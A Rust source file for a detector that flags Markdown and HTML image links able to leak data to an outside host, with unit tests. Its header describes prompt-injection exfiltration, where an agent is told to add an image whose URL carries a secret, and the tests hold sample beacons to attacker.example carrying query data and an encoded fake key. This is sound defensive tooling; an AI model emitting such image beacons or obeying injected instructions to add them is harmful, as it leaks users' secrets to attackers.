//! `detect.markdown_image_url`: images that make a renderer or an agent's
//! UI fetch an attacker URL, carrying data in the query string or in a long
//! encoded path segment. This is the classic prompt-injection exfiltration
//! channel: the agent is told to "add this image", with the secret in the
//! URL.
//!
//! Recognised forms: inline images `![alt](url "title")`, reference-style
//! images (`![alt][ref]`, `![ref][]`, `![ref]`) together with their
//! definitions `[ref]: url`, and HTML `<img src="url">`. Only absolute
//! `http(s)` URLs are considered. The Markdown is scanned by hand rather
//! than with one big regex so every construct is parsed in bounded,
//! linear time.

use std::collections::{HashMap, HashSet};
use std::ops::Range;

use ::regex::Regex;
use serde::Deserialize;

use super::Match;
use crate::text::escape_truncated;

/// Alt text and reference labels longer than this are not parsed as images.
const MAX_LABEL: usize = 1_000;

/// A title, or whitespace before a URL, longer than this is not parsed.
const MAX_DESTINATION: usize = 8 * 1024;

/// A path segment longer than this, made of base64/hex-like characters, is
/// treated like a query string.
const LONG_SEGMENT: usize = 40;

/// `detect.markdown_image_url` as written in a rule.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct MarkdownImageSpec {
    #[serde(default = "yes")]
    require_query: bool,
    #[serde(default)]
    allow_hosts: Vec<String>,
    #[serde(default)]
    ignore_code: bool,
}

fn yes() -> bool {
    true
}

impl MarkdownImageSpec {
    pub(crate) fn compile(self) -> Result<MarkdownImageDetector, String> {
        let mut allow_hosts = Vec::with_capacity(self.allow_hosts.len());
        for host in self.allow_hosts {
            let bare = host.strip_prefix("*.").unwrap_or(&host);
            let valid = !bare.is_empty()
                && bare
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.')
                && !bare.starts_with('.')
                && !bare.ends_with('.');
            if !valid {
                return Err(format!(
                    "detect.markdown_image_url.allow_hosts: `{host}` is not a host name or \
                     `*.suffix` (no scheme, port or path)"
                ));
            }
            allow_hosts.push(host.to_ascii_lowercase());
        }
        // Static patterns; compiling them cannot fail, but an error is still
        // an error rather than a panic.
        let definition = Regex::new(r"(?m)^ {0,3}\[([^\]\n]+)\]:[ \t]*<?([^\s>]+)>?")
            .map_err(|e| e.to_string())?;
        let img = Regex::new(r#"(?i)<img\b[^>]*?\ssrc\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))"#)
            .map_err(|e| e.to_string())?;
        Ok(MarkdownImageDetector {
            require_query: self.require_query,
            allow_hosts,
            ignore_code: self.ignore_code,
            definition,
            img,
        })
    }
}

/// A compiled `detect.markdown_image_url`.
#[derive(Debug)]
pub(crate) struct MarkdownImageDetector {
    require_query: bool,
    allow_hosts: Vec<String>,
    ignore_code: bool,
    definition: Regex,
    img: Regex,
}

/// An image URL found in the text.
struct Candidate {
    /// What to report (the whole image construct).
    range: Range<usize>,
    url: String,
}

impl MarkdownImageDetector {
    pub(crate) fn detect(&self, text: &str) -> Vec<Match> {
        let fences = if self.ignore_code {
            fenced_blocks(text)
        } else {
            Vec::new()
        };
        let in_code = |at: usize| fences.iter().any(|r| r.contains(&at));
        let mut candidates = Vec::new();
        let mut refs = HashSet::new();
        for image in markdown_images(text) {
            if in_code(image.range.start) {
                continue;
            }
            match image.target {
                Target::Inline(url) => candidates.push(Candidate {
                    range: image.range,
                    url,
                }),
                Target::Reference(label) => {
                    refs.insert(label);
                }
            }
        }
        if !refs.is_empty() {
            for caps in self.definition.captures_iter(text) {
                let (Some(whole), Some(label), Some(url)) = (caps.get(0), caps.get(1), caps.get(2))
                else {
                    continue;
                };
                if in_code(whole.start()) || !refs.contains(&normalize_label(label.as_str())) {
                    continue;
                }
                candidates.push(Candidate {
                    range: whole.range(),
                    url: url.as_str().to_owned(),
                });
            }
        }
        for caps in self.img.captures_iter(text) {
            let Some(whole) = caps.get(0) else { continue };
            if in_code(whole.start()) {
                continue;
            }
            if let Some(url) = caps.get(1).or_else(|| caps.get(2)).or_else(|| caps.get(3)) {
                candidates.push(Candidate {
                    range: whole.range(),
                    url: url.as_str().to_owned(),
                });
            }
        }
        candidates.sort_by_key(|c| c.range.start);
        candidates
            .into_iter()
            .filter_map(|c| {
                let reason = self.judge(&c.url)?;
                Some(Match::with_detail(c.range, reason))
            })
            .collect()
    }

    /// Why this URL is a beacon, or `None` if it is not.
    fn judge(&self, url: &str) -> Option<String> {
        let info = UrlInfo::parse(url)?;
        if self.allowed(&info.host) {
            return None;
        }
        let host = escape_truncated(&info.host, 100);
        if info.has_query {
            Some(format!("image URL to `{host}` with a query string"))
        } else if info.long_segment {
            Some(format!(
                "image URL to `{host}` with a long encoded path segment"
            ))
        } else if !self.require_query {
            Some(format!("image URL to external host `{host}`"))
        } else {
            None
        }
    }

    fn allowed(&self, host: &str) -> bool {
        self.allow_hosts
            .iter()
            .any(|pattern| match pattern.strip_prefix("*.") {
                Some(suffix) => host
                    .strip_suffix(suffix)
                    .is_some_and(|rest| rest.ends_with('.') && rest.len() > 1),
                None => host == pattern,
            })
    }
}

enum Target {
    Inline(String),
    Reference(String),
}

struct Image {
    range: Range<usize>,
    target: Target,
}

/// Every Markdown image (`![...](...)`, `![...][...]`, `![...]`).
fn markdown_images(text: &str) -> Vec<Image> {
    let mut out = Vec::new();
    if !text.contains("![") {
        return out;
    }
    let bytes = text.as_bytes();
    let idx = Positions::new(bytes);
    let mut pos = 0;
    while let Some(i) = text.get(pos..).and_then(|s| s.find("![")) {
        let start = pos + i;
        // An escaped `\![` is literal text.
        if start > 0 && bytes.get(start - 1) == Some(&b'\\') {
            pos = start + 2;
            continue;
        }
        let Some(alt_end) = idx.closing_bracket(start + 1) else {
            pos = start + 2;
            continue;
        };
        let alt = text.get(start + 2..alt_end).unwrap_or("");
        let after = alt_end + 1;
        match bytes.get(after) {
            Some(b'(') => {
                if let Some((url, end)) = inline_destination(text, after, &idx) {
                    out.push(Image {
                        range: start..end,
                        target: Target::Inline(url),
                    });
                    pos = end;
                    continue;
                }
            }
            Some(b'[') => {
                if let Some(label_end) = idx.closing_bracket(after) {
                    let label = text.get(after + 1..label_end).unwrap_or("");
                    let label = if label.trim().is_empty() { alt } else { label };
                    out.push(Image {
                        range: start..label_end + 1,
                        target: Target::Reference(normalize_label(label)),
                    });
                    pos = label_end + 1;
                    continue;
                }
            }
            _ => {
                if !alt.trim().is_empty() {
                    out.push(Image {
                        range: start..after,
                        target: Target::Reference(normalize_label(alt)),
                    });
                }
            }
        }
        pos = start + 2;
    }
    out
}

/// Positions of the delimiters image parsing needs, computed in one pass so
/// that each image is parsed with lookups instead of forward scans: a file
/// full of unterminated `![x](` or `![[[` stays linear.
struct Positions {
    /// Matching `[`/`]` and `(`/`)` pairs (backslash escapes honoured).
    pairs: HashMap<usize, usize>,
    /// Sorted offsets of whitespace bytes.
    space: Vec<usize>,
    /// Sorted offsets of `)`.
    close_paren: Vec<usize>,
    /// Sorted offsets of `>` and newlines (ends of `<url>`).
    angle_end: Vec<usize>,
}

impl Positions {
    fn new(bytes: &[u8]) -> Self {
        let mut pairs = HashMap::new();
        let mut brackets = Vec::new();
        let mut parens = Vec::new();
        let mut space = Vec::new();
        let mut close_paren = Vec::new();
        let mut angle_end = Vec::new();
        let mut i = 0;
        while let Some(&b) = bytes.get(i) {
            match b {
                b'\\' => i += 1,
                b'[' => brackets.push(i),
                b']' => {
                    if let Some(open) = brackets.pop() {
                        pairs.insert(open, i);
                    }
                }
                b'(' => parens.push(i),
                b')' => {
                    close_paren.push(i);
                    if let Some(open) = parens.pop() {
                        pairs.insert(open, i);
                    }
                }
                b' ' | b'\t' | b'\r' => space.push(i),
                b'\n' => {
                    space.push(i);
                    angle_end.push(i);
                }
                b'>' => angle_end.push(i),
                _ => {}
            }
            i += 1;
        }
        Self {
            pairs,
            space,
            close_paren,
            angle_end,
        }
    }

    /// The `]` matching the `[` at `open`, if the label is not too long.
    fn closing_bracket(&self, open: usize) -> Option<usize> {
        self.pairs
            .get(&open)
            .copied()
            .filter(|&close| close - open <= MAX_LABEL)
    }

    fn next(list: &[usize], from: usize) -> Option<usize> {
        list.get(list.partition_point(|&p| p < from)).copied()
    }
}

/// Parse `(url "title")` with `(` at `open`. Returns the URL and the offset
/// after `)`. As in `CommonMark`, the URL ends at whitespace or at the first
/// unbalanced `)`; `<url>` ends at `>`.
fn inline_destination(text: &str, open: usize, idx: &Positions) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let mut i = open + 1;
    // Leading whitespace, including line breaks.
    while matches!(bytes.get(i), Some(b' ' | b'\t' | b'\n' | b'\r')) && i - open < MAX_DESTINATION {
        i += 1;
    }
    let (url_start, url_end, after) = if bytes.get(i) == Some(&b'<') {
        let end = Positions::next(&idx.angle_end, i + 1)?;
        if bytes.get(end) != Some(&b'>') {
            return None;
        }
        (i + 1, end, end + 1)
    } else {
        let to_space = Positions::next(&idx.space, i).unwrap_or(text.len());
        let to_paren = idx.pairs.get(&open).copied().unwrap_or(text.len());
        let end = to_space.min(to_paren);
        (i, end, end)
    };
    // An optional title (it may contain `(` and span lines), then `)`.
    let close = Positions::next(&idx.close_paren, after)?;
    if close - after > MAX_DESTINATION {
        return None;
    }
    let url = text.get(url_start..url_end)?.to_owned();
    Some((url, close + 1))
}

/// Reference labels match case-insensitively with whitespace collapsed.
fn normalize_label(label: &str) -> String {
    label
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

/// Ranges of fenced code blocks (three or more backticks or tildes, up to
/// three spaces of indent).
fn fenced_blocks(text: &str) -> Vec<Range<usize>> {
    let mut out = Vec::new();
    let mut open: Option<(usize, u8, usize)> = None;
    let mut offset = 0;
    for line in text.split_inclusive('\n') {
        let indent = line.len() - line.trim_start_matches(' ').len();
        let trimmed = line.trim_start_matches(' ');
        let fence_char = trimmed.as_bytes().first().copied();
        let run = match fence_char {
            Some(c @ (b'`' | b'~')) if indent <= 3 => {
                trimmed.bytes().take_while(|&b| b == c).count()
            }
            _ => 0,
        };
        match open {
            None if run >= 3 => {
                open = fence_char.map(|c| (offset, c, run));
            }
            Some((start, c, len)) if run >= len && fence_char == Some(c) => {
                let rest = &trimmed[run..];
                if rest.trim().is_empty() {
                    out.push(start..offset + line.len());
                    open = None;
                }
            }
            _ => {}
        }
        offset += line.len();
    }
    if let Some((start, _, _)) = open {
        out.push(start..text.len());
    }
    out
}

/// The parts of an image URL that matter here.
struct UrlInfo {
    host: String,
    has_query: bool,
    long_segment: bool,
}

impl UrlInfo {
    fn parse(url: &str) -> Option<Self> {
        let lower = url.get(..8).unwrap_or(url).to_ascii_lowercase();
        let rest = if lower.starts_with("https://") {
            &url[8..]
        } else if lower.starts_with("http://") {
            &url[7..]
        } else {
            return None;
        };
        let authority_end = rest.find(['/', '?', '#', '\\']).unwrap_or(rest.len());
        let authority = &rest[..authority_end];
        let host_port = authority.rsplit('@').next().unwrap_or(authority);
        let host = if let Some(v6) = host_port.strip_prefix('[') {
            v6.split(']').next().unwrap_or(v6)
        } else {
            host_port.split(':').next().unwrap_or(host_port)
        };
        let host = host.trim_end_matches('.').to_ascii_lowercase();
        if host.is_empty() {
            return None;
        }
        let tail = &rest[authority_end..];
        let without_fragment = tail.split('#').next().unwrap_or(tail);
        let (path, query) = match without_fragment.split_once('?') {
            Some((p, q)) => (p, Some(q)),
            None => (without_fragment, None),
        };
        let has_query = query.is_some_and(|q| !q.is_empty());
        let long_segment = path.split('/').any(|segment| {
            // `<blob>.png` still counts: drop a short extension first.
            let stem = match segment.rsplit_once('.') {
                Some((stem, ext)) if ext.len() <= 5 => stem,
                _ => segment,
            };
            stem.len() > LONG_SEGMENT
                && stem
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '=' | '_' | '-' | '%'))
        });
        Some(Self {
            host,
            has_query,
            long_segment,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn det(yaml: &str) -> MarkdownImageDetector {
        let spec: MarkdownImageSpec = serde_saphyr::from_str(yaml).unwrap();
        spec.compile().unwrap()
    }

    fn default() -> MarkdownImageDetector {
        det("allow_hosts: [img.shields.io, '*.githubusercontent.com']")
    }

    fn hits(d: &MarkdownImageDetector, text: &str) -> Vec<String> {
        d.detect(text)
            .into_iter()
            .map(|m| text[m.range].to_string())
            .collect()
    }

    #[test]
    fn inline_image_with_query_string() {
        let text = "Hello ![status](https://attacker.example/p.png?d=SECRET \"t\") bye";
        let m = default().detect(text);
        assert_eq!(m.len(), 1);
        assert_eq!(
            &text[m[0].range.clone()],
            "![status](https://attacker.example/p.png?d=SECRET \"t\")"
        );
        assert!(m[0].detail.as_ref().unwrap().contains("attacker.example"));
    }

    #[test]
    fn plain_images_and_allowlisted_hosts_are_quiet() {
        let d = default();
        for text in [
            "![logo](./docs/logo.png)",
            "![badge](https://img.shields.io/badge/ci-green?style=flat)",
            "![x](https://raw.githubusercontent.com/o/r/main/a.png?raw=true)",
            "![x](https://example.com/static/logo.png)",
            "[link](https://attacker.example/?q=1)",
            "![x](https://attacker.example/a.png#frag=1)",
            "![x](https://attacker.example/a.png?)",
            "\\![x](https://attacker.example/a.png?q=1)",
        ] {
            assert!(hits(&d, text).is_empty(), "{text}");
        }
    }

    #[test]
    fn suffix_patterns_do_not_match_the_apex_or_lookalikes() {
        let d = det("allow_hosts: ['*.example.com']");
        assert!(hits(&d, "![x](https://cdn.example.com/a?q=1)").is_empty());
        assert_eq!(hits(&d, "![x](https://example.com/a?q=1)").len(), 1);
        assert_eq!(hits(&d, "![x](https://evilexample.com/a?q=1)").len(), 1);
    }

    #[test]
    fn host_parsing_is_not_fooled_by_userinfo_or_case() {
        let d = det("allow_hosts: [img.shields.io]");
        assert_eq!(
            hits(&d, "![x](https://img.shields.io@attacker.example/a?q=1)").len(),
            1
        );
        assert!(hits(&d, "![x](HTTPS://IMG.SHIELDS.IO:443/a?q=1)").is_empty());
        assert!(hits(&d, "![x](https://img.shields.io./a?q=1)").is_empty());
    }

    #[test]
    fn long_encoded_path_segment() {
        let blob = "QUtJQV9URVNUX0ZBS0VfS0VZXzEyMzQ1Njc4OTBhYmNkZWY";
        let text = format!("![x](https://attacker.example/c/{blob}.png)");
        let m = default().detect(&text);
        assert_eq!(m.len(), 1);
        assert!(m[0].detail.as_ref().unwrap().contains("long encoded path"));
        // A normal long-ish file name with dots and words is fine.
        assert!(hits(
            &default(),
            "![x](https://attacker.example/images/screenshot-2026.png)"
        )
        .is_empty());
    }

    #[test]
    fn require_query_false_flags_any_external_host() {
        let d = det("require_query: false\nallow_hosts: [img.shields.io]");
        assert_eq!(hits(&d, "![x](https://attacker.example/a.png)").len(), 1);
        assert!(hits(&d, "![x](https://img.shields.io/a.png)").is_empty());
        assert!(hits(&d, "![x](images/a.png)").is_empty());
    }

    #[test]
    fn reference_style_images() {
        let text = "See ![chart][c1] and ![Other]\n\n[c1]: https://attacker.example/i.png?d=1 \"t\"\n[other]: https://attacker.example/o.png?x=2\n[unused]: https://attacker.example/u.png?x=3\n";
        let got = hits(&default(), text);
        assert_eq!(got.len(), 2, "{got:?}");
        assert!(got[0].starts_with("[c1]:"));
        assert!(got[1].starts_with("[other]:"));
    }

    #[test]
    fn collapsed_reference() {
        let text = "![logo][]\n\n[logo]: https://attacker.example/l.png?id=7\n";
        assert_eq!(hits(&default(), text).len(), 1);
    }

    #[test]
    fn html_img_tags() {
        let text = "<p><img alt=\"x\" src=\"https://attacker.example/t.gif?u=1\"></p>\n<IMG SRC=https://attacker.example/u?x=1>\n<img src='https://img.shields.io/b?x=1'>";
        let got = hits(&default(), text);
        assert_eq!(got.len(), 2, "{got:?}");
    }

    #[test]
    fn urls_with_parentheses_and_angle_brackets() {
        let d = default();
        assert_eq!(
            hits(&d, "![x](https://attacker.example/a_(b).png?q=1)"),
            vec!["![x](https://attacker.example/a_(b).png?q=1)"]
        );
        assert_eq!(
            hits(&d, "![x](<https://attacker.example/a b.png?q=1>)").len(),
            1
        );
        assert_eq!(
            hits(&d, "![x](\n  https://attacker.example/a.png?q=1\n)").len(),
            1
        );
        assert_eq!(
            hits(&d, "![a [nested] alt](https://attacker.example/a?q=1)").len(),
            1
        );
    }

    #[test]
    fn code_blocks_only_ignored_when_asked() {
        let text = "```md\n![x](https://attacker.example/a?q=1)\n```\n~~~\n![y](https://attacker.example/b?q=1)\n";
        assert_eq!(hits(&default(), text).len(), 2);
        let d = det("ignore_code: true");
        assert!(hits(&d, text).is_empty());
        let after = "```\ncode\n```\n![z](https://attacker.example/c?q=1)\n";
        assert_eq!(hits(&d, after).len(), 1);
    }

    #[test]
    fn allow_hosts_validation() {
        for bad in [
            "https://x.example",
            "x.example/p",
            "x.example:443",
            "",
            "*.",
            ".x",
        ] {
            let spec = MarkdownImageSpec {
                require_query: true,
                allow_hosts: vec![bad.into()],
                ignore_code: false,
            };
            assert!(spec.compile().is_err(), "{bad}");
        }
    }

    #[test]
    fn unterminated_constructs_do_not_panic() {
        let d = default();
        for text in [
            "![",
            "![x",
            "![x](",
            "![x](<https://a.example",
            "![x][",
            "<img src=",
            "![x](https://",
        ] {
            let _ = d.detect(text);
        }
        let many = "![".repeat(50_000);
        assert!(d.detect(&many).is_empty());
        // Unterminated destinations are bounded, not scanned to the end.
        let start = std::time::Instant::now();
        assert!(d.detect(&"![x](".repeat(100_000)).is_empty());
        assert!(d.detect(&"![x](<".repeat(100_000)).is_empty());
        assert!(d.detect(&"![x](".repeat(100_000)).is_empty());
        assert!(d.detect(&"![[".repeat(100_000)).is_empty());
        let nested = format!("{}{}", "![a](".repeat(50_000), ")".repeat(50_000));
        assert!(d.detect(&nested).is_empty());
        assert!(start.elapsed() < std::time::Duration::from_secs(5));
    }
}
